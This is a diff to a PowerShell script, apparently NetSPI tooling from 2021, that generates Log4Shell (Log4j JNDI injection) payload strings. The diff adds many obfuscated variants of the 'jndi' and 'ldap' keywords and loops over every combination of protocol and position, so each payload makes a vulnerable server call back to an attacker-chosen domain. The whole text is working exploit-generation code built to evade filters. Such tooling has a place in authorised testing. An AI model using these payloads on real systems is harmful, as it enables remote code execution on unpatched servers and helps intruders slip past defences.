@@ -1,6 +1,6 @@
 # Author: Scott Sutherland, NetSPI 2021
 # Create-Log4jPayload -Domain "callback.domain.com" -Port 389
-# Todo: encoding, more command variations, protocol variations, obfuscation variations?
+# Todo: encoding, more command variations, protocol variations, and obfuscation variations...
 # Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
 function Create-Log4jPayload
 (
@@ -9,11 +9,25 @@ function Create-Log4jPayload
     [Parameter(Position = 0)][System.String]$Word = (1..10 | foreach {[char](Get-Random -min 97 -Maximum 122)}) -join ''
 )
 {
+
+    # Create list jndi variation
+    $jndi = new-object System.Data.DataTable 
+    $null = $jndi.Columns.Add("value")
+    $null = $jndi.Rows.Add("JnDi")
+    $null = $jndi.Rows.Add("jndi")
+    $null = $jndi.Rows.Add("`${lower:jndi}")
+    $null = $jndi.Rows.Add("`${lower:`${lower:jndi}}")
+    $null = $jndi.Rows.Add("`${lower:j}`${lower:n}`${lower:d}i")
+    $null = $jndi.Rows.Add("`${upper:jndi}")
+    $null = $jndi.Rows.Add("`${upper:j}`${upper:n}`${upper:d}i")    
+    $null = $jndi.Rows.Add("`${env:TEST:-j}ndi")    
+    
     # Create list of procotols
     $Protocol = new-object System.Data.DataTable 
     $null = $Protocol.Columns.Add("value")
     $null = $Protocol.Rows.Add("ldap")
     $null = $Protocol.Rows.Add("`${lower:l}`${lower:d}a`${lower:p}")
+    $null = $Protocol.Rows.Add("`${env:TEST:-l}dap")
     $null = $Protocol.Rows.Add("rmi")
     $null = $Protocol.Rows.Add("dns")
 
@@ -70,31 +84,27 @@ function Create-Log4jPayload
 
 
     # Generate Payload Variations
-    $Protocol | Select-Object value -ExpandProperty value |
-    Foreach {    
-        $CurrentProtocol = $_       
-        $MidPos1 | Select-Object value -ExpandProperty value |
-        Foreach{
-            $CurrentMidPos1 = $_         
-            $MidPos2 | Select-Object value -ExpandProperty value | 
+    $jndi | Select-Object value -ExpandProperty value |
+    Foreach{        
+        $Currentjndi = $_
+        $Protocol | Select-Object value -ExpandProperty value |
+        Foreach{    
+            $CurrentProtocol = $_       
+            $MidPos1 | Select-Object value -ExpandProperty value |
             Foreach{
-                $CurrentMidPos2 = $_          
-                $EndPos | Select-Object value -ExpandProperty value |
-                foreach{
-                    $CurrentEndPos = $_
-                    $null = $PayloadVariations.Rows.Add("`${jndi:" + $CurrentProtocol + "://" + $CurrentMidPos1 + $CurrentMidPos2 + $domain + $CurrentEndPos + "}")
-                }   
-            }      
-        }       
+                $CurrentMidPos1 = $_         
+                $MidPos2 | Select-Object value -ExpandProperty value | 
+                Foreach{
+                    $CurrentMidPos2 = $_          
+                    $EndPos | Select-Object value -ExpandProperty value |
+                    foreach{
+                        $CurrentEndPos = $_
+                        $null = $PayloadVariations.Rows.Add("`${$Currentjndi" + ":" + $CurrentProtocol + "://" + $CurrentMidPos1 + $CurrentMidPos2 + $domain + $CurrentEndPos + "}")
+                    }   
+                }      
+            } 
+        }      
     }
-
-    # Add baseline obfuscation examples 
-    $null = $PayloadVariations.Rows.Add("`${`${lower:jndi}:`${lower:rmi}://$Domain/$word}")
-    $null = $PayloadVariations.Rows.Add("`${`${lower:`${lower:jndi}}:`${lower:rmi}://$Domain/$word}")
-    $null = $PayloadVariations.Rows.Add("`${`${lower:j}`${lower:n}`${lower:d}i:`${lower:rmi}://$Domain/$word}")
-    $null = $PayloadVariations.Rows.Add("`${jndi:`${lower:l}`${lower:d}a`${lower:p}://$Domain/$word}")
-    $null = $PayloadVariations.Rows.Add("`${jndi:ldap:`${upper:/}`${upper:/}$Domain`:$port/$word}")
-    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain/$word}")  
 
     # Show variations
     $PayloadVariations
